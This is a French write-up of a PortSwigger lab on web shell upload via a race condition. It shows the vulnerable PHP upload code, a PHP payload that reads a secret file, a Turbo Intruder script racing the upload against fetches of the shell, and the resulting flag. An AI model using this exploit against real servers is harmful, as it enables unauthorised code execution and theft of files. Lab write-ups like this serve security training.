# Lab

https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition

## Solution

Pour ce lab, il faut uploader un fichier PHP qui va nous permettre d'exécuter des commandes sur le serveur.

Voici le code responsable de l'upload du fichier:

```php
<?php
    $target_dir = "avatars/";
    $target_file = $target_dir . $_FILES["avatar"]["name"];

    // temporary move
    move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

    if (checkViruses($target_file) && checkFileType($target_file)) {
        echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
    } else {
        unlink($target_file);
        echo "Sorry, there was an error uploading your file.";
        http_response_code(403);
    }

    function checkViruses($fileName) {
        // checking for viruses
    }

    function checkFileType($fileName) {
        $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
        if($imageFileType != "jpg" && $imageFileType != "png") {
            echo "Sorry, only JPG & PNG files are allowed\n";
            return false;
        } else {
            return true;
        }
    }
?>
```

La vulnérabilité exploitée ici est que le fichier est posté sur le serveur, puis vérifié et si il ne correspond pas aux critères d'upload, alors il sera supprimé.

Ce qui veut dire que pendant un court laps de temps, le fichier est présent sur le serveur, mais n'est pas vérifié.

On peut donc utiliser une course condition pour exploiter cette vulnérabilité et accéder au fichier avant qu'il ne soit supprimé.

Dans la description du lab on sait que le flag se trouve dans le fichier `/home/carlos/secret`.

Donc avec ce script php, on peut récupérer le flag:

```php
<?php echo file_get_contents('/home/carlos/secret') ?>
```

Avec ce script Turbo Intruder :

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''POST /my-account/avatar HTTP/2
Host: 0a5800390329e68a8160618a009600f3.web-security-academy.net
Cookie: session=4JMC33Vm8XjvTy8HY2WjzTUk0N6wNeED
Content-Length: 745
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxzs5zCewsmjQSXVi
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

------WebKitFormBoundaryxzs5zCewsmjQSXVi
Content-Disposition: form-data; name="avatar"; filename="simple.php"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryxzs5zCewsmjQSXVi
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryxzs5zCewsmjQSXVi
Content-Disposition: form-data; name="csrf"

usDYYiTQyMDdfYj0m1hQRj0XwkldA2lx
------WebKitFormBoundaryxzs5zCewsmjQSXVi--
'''

    request2 = '''GET /files/avatars/simple.php HTTP/2
Host: 0a5800390329e68a8160618a009600f3.web-security-academy.net
Cookie: session=4JMC33Vm8XjvTy8HY2WjzTUk0N6wNeED
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```

On obtient des réponses `HTTP 200` avec le flag:

```http
HTTP/1.1 200 OK
Date: Fri, 05 Jan 2024 11:19:49 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 32

lU1Qymp5QkH9fy9OaKkmx6f0uRg5gxNg
```